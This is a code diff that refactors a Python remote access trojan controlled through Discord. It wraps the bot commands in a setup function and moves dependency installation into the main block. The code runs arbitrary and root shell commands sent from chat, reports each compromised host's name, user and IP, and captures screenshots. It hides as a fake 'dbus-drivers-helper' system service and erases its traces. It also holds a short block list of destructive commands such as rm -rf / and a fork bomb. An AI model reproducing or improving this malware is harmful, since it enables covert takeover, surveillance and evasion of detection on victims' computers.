@@ -555,160 +555,164 @@ def take_screenshot():
         logger.error(f"Screenshot error: {e}")
         return None
 
-# ----------------- BOT SETUP -----------------
-# Install dependencies first
-install_dependencies()
+# ----------------- MAIN BOT SETUP -----------------
+def setup_bot():
+    """Setup and run the Discord bot"""
+    # Import Discord modules after dependencies are installed
+    import discord
+    from discord.ext import commands
+    
+    # Set up intents and bot
+    intents = discord.Intents.default()
+    intents.message_content = True
+    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-# ----------------- BOT COMMANDS -----------------
-@bot.event
-async def on_ready():
-    """Bot startup - announce system status"""
-    logger.info("Stealth system initialized and running")
-    
-    # Auto-install on first run
-    if not STEALTH_BINARY.exists():
-        install_stealth()
-        # Drop privileges after installation
-        drop_privileges()
-    
-    clean_traces()
-    
-    # Announce system startup
-    system_info = get_system_info()
-    announcement_channel = None
-    
-    # Try to find a channel to announce in
-    for guild in bot.guilds:
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).send_messages:
-                announcement_channel = channel
+    # ----------------- BOT COMMANDS -----------------
+    @bot.event
+    async def on_ready():
+        """Bot startup - announce system status"""
+        logger.info("Stealth system initialized and running")
+        
+        # Auto-install on first run
+        if not STEALTH_BINARY.exists():
+            install_stealth()
+            # Drop privileges after installation
+            drop_privileges()
+        
+        clean_traces()
+        
+        # Announce system startup
+        system_info = get_system_info()
+        announcement_channel = None
+        
+        # Try to find a channel to announce in
+        for guild in bot.guilds:
+            for channel in guild.text_channels:
+                if channel.permissions_for(guild.me).send_messages:
+                    announcement_channel = channel
+                    break
+            if announcement_channel:
                 break
+        
         if announcement_channel:
-            break
-    
-    if announcement_channel:
-        message = f"🚀 **System Online**\n"
-        message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
-        message += f"**User:** {system_info.get('username', 'Unknown')}\n"
-        message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
-        message += f"**OS:** {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
-        message += f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
-        message += f"**Status:** Operational and hidden"
-        
-        try:
-            await announcement_channel.send(message)
-        except Exception as e:
-            logger.error(f"Failed to send announcement: {e}")
-
-@bot.command(name="sysinfo")
-async def cmd_sysinfo(ctx):
-    """Get system information"""
-    system_info = get_system_info()
-    
-    message = f"💻 **System Information**\n"
-    message += f"```\n"
-    message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
-    message += f"Username: {system_info.get('username', 'Unknown')}\n"
-    message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
-    message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
-    message += f"Processor: {system_info.get('processor', 'Unknown')}\n"
-    message += f"Uptime: {system_info.get('uptime_days', 0)} days\n"
-    message += f"```"
-    
-    await ctx.send(message)
-
-@bot.command(name="cmd")
-async def cmd_exec(ctx, *, command: str):
-    """Execute system command (non-privileged)"""
-    try:
-        # Security check - prevent dangerous commands
-        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
-        if any(dangerous in command for dangerous in dangerous_commands):
-            await ctx.send("❌ Command blocked for security reasons")
-            return
+            message = f"🚀 **System Online**\n"
+            message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
+            message += f"**User:** {system_info.get('username', 'Unknown')}\n"
+            message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
+            message += f"**OS:** {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
+            message += f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
+            message += f"**Status:** Operational and hidden"
             
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-        output = result.stdout or result.stderr or "No output"
-        
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-            
-        await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
-    except Exception as e:
-        await ctx.send(f"❌ Command failed: {e}")
+            try:
+                await announcement_channel.send(message)
+            except Exception as e:
+                logger.error(f"Failed to send announcement: {e}")
 
-@bot.command(name="root")
-async def cmd_root(ctx, *, command: str):
-    """Execute system command with root privileges"""
-    try:
-        # Security check - prevent extremely dangerous commands
-        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
-        if any(dangerous in command for dangerous in dangerous_commands):
-            await ctx.send("❌ Command blocked for security reasons")
-            return
-            
-        # Execute with sudo
-        result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True, timeout=30)
-        output = result.stdout or result.stderr or "No output"
-        
-        if len(output) > 1900:
-            output = output[:1900] + "..."
-            
-        await ctx.send(f"```bash\n# {command}\n{output}\nExit: {result.returncode}\n```")
-    except Exception as e:
-        await ctx.send(f"❌ Root command failed: {e}")
-
-@bot.command(name="clean")
-async def cmd_clean(ctx):
-    """Clean all traces"""
-    if clean_traces():
-        await ctx.send("✅ All traces cleaned")
-    else:
-        await ctx.send("❌ Clean failed")
-
-@bot.command(name="status")
-async def cmd_status(ctx):
-    """Check bot status"""
-    try:
-        # Check if service is running
-        result = subprocess.run(["systemctl", "is-active", "dbus-drivers-helper.service"], 
-                              capture_output=True, text=True)
-        status = "🟢 Running" if result.returncode == 0 else "🔴 Stopped"
-        
-        # Get system info
+    @bot.command(name="sysinfo")
+    async def cmd_sysinfo(ctx):
+        """Get system information"""
         system_info = get_system_info()
         
-        await ctx.send(f"**Bot Status:** {status}\n"
-                      f"**Service:** `dbus-drivers-helper.service`\n"
-                      f"**Location:** `{STEALTH_BINARY}`\n"
-                      f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
-                      f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
-                      f"**Privileges:** {'Root' if os.geteuid() == 0 else 'User'}")
-    except:
-        await ctx.send("✅ Bot is operational")
+        message = f"💻 **System Information**\n"
+        message += f"```\n"
+        message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
+        message += f"Username: {system_info.get('username', 'Unknown')}\n"
+        message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
+        message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
+        message += f"Processor: {system_info.get('processor', 'Unknown')}\n"
+        message += f"Uptime: {system_info.get('uptime_days', 0)} days\n"
+        message += f"```"
+        
+        await ctx.send(message)
 
-@bot.command(name="restart")
-async def cmd_restart(ctx):
-    """Restart the bot service"""
-    try:
-        # Need sudo to restart service
-        subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], 
-                      check=False, capture_output=True)
-        await ctx.send("✅ Bot service restarted")
-    except:
-        await ctx.send("❌ Restart failed")
+    @bot.command(name="cmd")
+    async def cmd_exec(ctx, *, command: str):
+        """Execute system command (non-privileged)"""
+        try:
+            # Security check - prevent dangerous commands
+            dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
+            if any(dangerous in command for dangerous in dangerous_commands):
+                await ctx.send("❌ Command blocked for security reasons")
+                return
+                
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout or result.stderr or "No output"
+            
+            if len(output) > 1900:
+                output = output[:1900] + "..."
+                
+            await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
+        except Exception as e:
+            await ctx.send(f"❌ Command failed: {e}")
 
-@bot.command(name="update")
-async def cmd_update(ctx):
-    """Update the bot"""
-    try:
-        # Create update script
-        update_script = "/tmp/update_bot.sh"
-        script_content = f"""#!/bin/bash
+    @bot.command(name="root")
+    async def cmd_root(ctx, *, command: str):
+        """Execute system command with root privileges"""
+        try:
+            # Security check - prevent extremely dangerous commands
+            dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
+            if any(dangerous in command for dangerous in dangerous_commands):
+                await ctx.send("❌ Command blocked for security reasons")
+                return
+                
+            # Execute with sudo
+            result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout or result.stderr or "No output"
+            
+            if len(output) > 1900:
+                output = output[:1900] + "..."
+                
+            await ctx.send(f"```bash\n# {command}\n{output}\nExit: {result.returncode}\n```")
+        except Exception as e:
+            await ctx.send(f"❌ Root command failed: {e}")
+
+    @bot.command(name="clean")
+    async def cmd_clean(ctx):
+        """Clean all traces"""
+        if clean_traces():
+            await ctx.send("✅ All traces cleaned")
+        else:
+            await ctx.send("❌ Clean failed")
+
+    @bot.command(name="status")
+    async def cmd_status(ctx):
+        """Check bot status"""
+        try:
+            # Check if service is running
+            result = subprocess.run(["systemctl", "is-active", "dbus-drivers-helper.service"], 
+                                  capture_output=True, text=True)
+            status = "🟢 Running" if result.returncode == 0 else "🔴 Stopped"
+            
+            # Get system info
+            system_info = get_system_info()
+            
+            await ctx.send(f"**Bot Status:** {status}\n"
+                          f"**Service:** `dbus-drivers-helper.service`\n"
+                          f"**Location:** `{STEALTH_BINARY}`\n"
+                          f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
+                          f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
+                          f"**Privileges:** {'Root' if os.geteuid() == 0 else 'User'}")
+        except:
+            await ctx.send("✅ Bot is operational")
+
+    @bot.command(name="restart")
+    async def cmd_restart(ctx):
+        """Restart the bot service"""
+        try:
+            # Need sudo to restart service
+            subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], 
+                          check=False, capture_output=True)
+            await ctx.send("✅ Bot service restarted")
+        except:
+            await ctx.send("❌ Restart failed")
+
+    @bot.command(name="update")
+    async def cmd_update(ctx):
+        """Update the bot"""
+        try:
+            # Create update script
+            update_script = "/tmp/update_bot.sh"
+            script_content = f"""#!/bin/bash
 # Kill current process
 sudo systemctl stop dbus-drivers-helper.service
 # Wait a moment
@@ -719,65 +723,70 @@ sudo cp {STEALTH_BINARY} {STEALTH_BINARY}.backup
 sudo systemctl start dbus-drivers-helper.service
 echo "Update completed"
 """
-        
-        with open(update_script, 'w') as f:
-            f.write(script_content)
-        
-        subprocess.run(["chmod", "+x", update_script])
-        subprocess.run([update_script], check=False)
-        
-        await ctx.send("✅ Bot updated successfully")
-    except Exception as e:
-        await ctx.send(f"❌ Update failed: {e}")
+            
+            with open(update_script, 'w') as f:
+                f.write(script_content)
+            
+            subprocess.run(["chmod", "+x", update_script])
+            subprocess.run([update_script], check=False)
+            
+            await ctx.send("✅ Bot updated successfully")
+        except Exception as e:
+            await ctx.send(f"❌ Update failed: {e}")
 
-@bot.command(name="screen")
-async def cmd_screen(ctx):
-    """Take a screenshot of the current display"""
-    try:
-        await ctx.send("📸 Taking screenshot...")
-        
-        # Take screenshot using the external script
-        screenshot_path = take_screenshot()
-        
-        if screenshot_path and os.path.exists(screenshot_path):
-            # Send the screenshot file
-            with open(screenshot_path, 'rb') as f:
-                picture = discord.File(f, filename='screenshot.png')
-                await ctx.send(file=picture)
+    @bot.command(name="screen")
+    async def cmd_screen(ctx):
+        """Take a screenshot of the current display"""
+        try:
+            await ctx.send("📸 Taking screenshot...")
             
-            # Clean up the temporary file
-            try:
-                os.remove(screenshot_path)
-            except:
-                pass
-        else:
-            await ctx.send("❌ Failed to capture screenshot - Make sure you have a graphical desktop running")
+            # Take screenshot using the external script
+            screenshot_path = take_screenshot()
             
-    except Exception as e:
-        await ctx.send(f"❌ Screenshot error: {e}")
+            if screenshot_path and os.path.exists(screenshot_path):
+                # Send the screenshot file
+                with open(screenshot_path, 'rb') as f:
+                    picture = discord.File(f, filename='screenshot.png')
+                    await ctx.send(file=picture)
+                
+                # Clean up the temporary file
+                try:
+                    os.remove(screenshot_path)
+                except:
+                    pass
+            else:
+                await ctx.send("❌ Failed to capture screenshot - Make sure you have a graphical desktop running")
+                
+        except Exception as e:
+            await ctx.send(f"❌ Screenshot error: {e}")
 
-@bot.command(name="delete")
-async def cmd_delete(ctx):
-    """Completely remove the bot and all traces"""
-    try:
-        await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
-        
-        # Run self-destruct
-        if self_destruct():
-            await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
+    @bot.command(name="delete")
+    async def cmd_delete(ctx):
+        """Completely remove the bot and all traces"""
+        try:
+            await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
             
-            # Exit the bot
-            await bot.close()
-        else:
-            await ctx.send("❌ Self-destruct failed - Manual cleanup may be required")
-            
-    except Exception as e:
-        await ctx.send(f"❌ Self-destruct error: {e}")
+            # Run self-destruct
+            if self_destruct():
+                await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
+                
+                # Exit the bot
+                await bot.close()
+            else:
+                await ctx.send("❌ Self-destruct failed - Manual cleanup may be required")
+                
+        except Exception as e:
+            await ctx.send(f"❌ Self-destruct error: {e}")
+    
+    return bot
 
 # ----------------- MAIN -----------------
 if __name__ == "__main__":
     # Acquire singleton lock to prevent multiple instances
     lock_fd = acquire_lock()
+    
+    # Install dependencies first
+    install_dependencies()
     
     # Check if we need to fetch token from web
     if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
@@ -811,6 +820,9 @@ if __name__ == "__main__":
         # Drop privileges after installation
         drop_privileges()
         clean_traces()
+    
+    # Setup and run the bot
+    bot = setup_bot()
     
     # Run the bot with retry logic
     max_retries = 3
